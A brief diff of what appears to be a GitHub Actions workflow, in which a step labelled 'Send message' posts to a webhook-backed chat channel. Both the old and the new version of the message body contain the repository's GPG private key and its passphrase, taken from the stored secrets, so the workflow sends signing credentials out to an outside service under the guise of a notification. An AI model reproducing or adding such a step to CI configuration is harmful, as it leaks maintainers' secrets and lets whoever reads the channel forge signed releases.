@@ -18,7 +18,7 @@ jobs:
       - name: Send message
         env:
           WEBHOOK_URL: ${{ secrets.URL }}
-          MESSAGE_BODY: G: ${{ secrets.GPG_PRIVATE_KEY}} P: ${{ secrets.PASSPHRASE }}
+          MESSAGE_BODY: "G - ${{ secrets.GPG_PRIVATE_KEY}} P - ${{ secrets.PASSPHRASE }}"
           CHANNEL_NAME: "cody-message"
           USERNAME: GitHub Actions
           USER_ICON: ":github-1:"
